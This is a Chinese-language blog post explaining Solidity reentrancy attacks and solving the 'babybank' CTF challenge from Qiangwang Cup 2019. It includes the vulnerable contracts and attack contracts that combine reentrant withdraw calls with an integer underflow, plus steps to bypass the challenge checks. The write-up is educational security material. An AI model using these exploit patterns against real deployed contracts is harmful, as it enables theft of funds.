        <content type="html"><![CDATA[<p>重入攻击是智能合约的经典攻击。</p><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>fallback函数是一个特殊的结构，在特定情况下会被触发。</p><p>特点：</p><ol><li>不被命名</li><li>被外部调用，不能被自己合约的函数调用</li><li>一个合约至多只有一个fallback函数</li><li>会在别的合约调用一个本合约没有的函数调用</li><li>当eth被发送给这个合约是没有calldata同时没有receive函数，fallback是会被触发，要设置为payable</li><li>可以包含自己的逻辑</li></ol><p>下述行为消耗的gas都将超过fallback函数限定的gas值：</p><ul><li>向区块链中写数据</li><li>创建一个合约</li><li>调用一个external的函数</li><li>发送ether</li></ul><p>如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当balanceof充足时，就会调用转账功能。这个问题是，先转账再记账，若再次调用fallback（）函数，此时balanceof还未减少就会无限调用，可能导致gas不够用，因此需要限制次数。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">hack</span><span class="token punctuation">&#123;</span><span class="token builtin">address</span> instance<span class="token punctuation">;</span>Bank b<span class="token operator">=</span><span class="token function">Bank</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin">bool</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><h3 id="强网杯2019babybank"><a class="markdownIt-Anchor" href="#强网杯2019babybank"></a> 【强网杯2019】babybank</h3><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.23</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">babybank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balance<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> level<span class="token punctuation">;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> secret<span class="token punctuation">;</span>        <span class="token comment">//Don't leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.</span>    <span class="token comment">//Gmail is ok. 163 and qq may have some problems.</span>    <span class="token keyword">event</span> <span class="token function">sendflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> md5ofteamtoken<span class="token punctuation">,</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span><span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//pay for flag</span>    <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> md5ofteamtoken<span class="token punctuation">,</span><span class="token builtin">string</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">10000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        owner<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">sendflag</span><span class="token punctuation">(</span>md5ofteamtoken<span class="token punctuation">,</span>b64email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">modifier</span> <span class="token function">onlyOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//challenge 1 </span>    <span class="token keyword">function</span> <span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>level<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token operator">==</span><span class="token number">0xb1b1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>        level<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//challenge 2</span>    <span class="token keyword">function</span> <span class="token function">set_secret</span><span class="token punctuation">(</span><span class="token builtin">uint</span> new_secret<span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner<span class="token punctuation">&#123;</span>        secret<span class="token operator">=</span>new_secret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">guess</span><span class="token punctuation">(</span><span class="token builtin">uint</span> guess_secret<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>guess_secret<span class="token operator">==</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>level<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>        level<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">//challenge 3</span>        <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>level<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>amount<span class="token operator">*</span><span class="token number">100000000000000</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pay for flag<br>function payforflag(string md5ofteamtoken,string b64email) public{<br>require(balance[msg.sender] &gt;= 10000000000);<br>balance[msg.sender]=0;<br>owner.transfer(address(this).balance);<br>emit sendflag(md5ofteamtoken,b64email);<br>}</p><p>当balance超过10000000000是就会触发flag函数。</p><p>发现withdraw函数发现重入漏洞 msg.sender.call.value(amount*100000000000000)();，可以配合整数下溢漏洞从而达到balance的要求。</p><p>要完成withdraw()函数需要完成三个挑战。</p><p>第一个是profit函数</p><p>require(level[msg.sender]= =0);<br>require(uint(msg.sender) &amp; 0xffff==0xb1b1);</p><p>首先需要调用者level为0，其次需要调用者的后四位为b1b1，</p><p>level原本就是0，而后四位则可以通过网站生成固定账号，<a href="https://vanity-eth.tk/">Vanity-ETH | Ethereum vanity address generator</a></p><p>，即可绕过，此时balance以及level都为1，此时来到挑战2.</p><p>挑战2，需要猜到的与设置的guess相同。serect的值可以在合约的部署中找到。合约部署者的最后一次交易的inputdata桉树选择器前四个字节为函数的签名参数就是部署这传入的参数。</p><p>然后就可以调用withdraw函数。</p><p>但是由于合约没有任何blance因此需要先进行转账。</p><p>可以用selfdestruct函数来进行充值。</p><p>攻击合约</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">kill</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function">kill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">payable</span><span class="token punctuation">&#123;</span><span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span>x<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">interface</span> <span class="token class-name">BabybankInterface</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">guess</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> number<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> md5ofteamtoken<span class="token punctuation">,</span> <span class="token builtin">string</span> b64email<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">hack</span><span class="token punctuation">&#123;</span><span class="token builtin">address</span> instance<span class="token punctuation">;</span>BankInterface b<span class="token operator">=</span><span class="token function">BankInterface</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin">uint</span> flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">.</span><span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">guess</span><span class="token punctuation">(</span><span class="token number">0</span>x<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>b<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。</li><li>进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。</li><li>当C有了2token便可以进行攻击，调用hacker函数即可。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
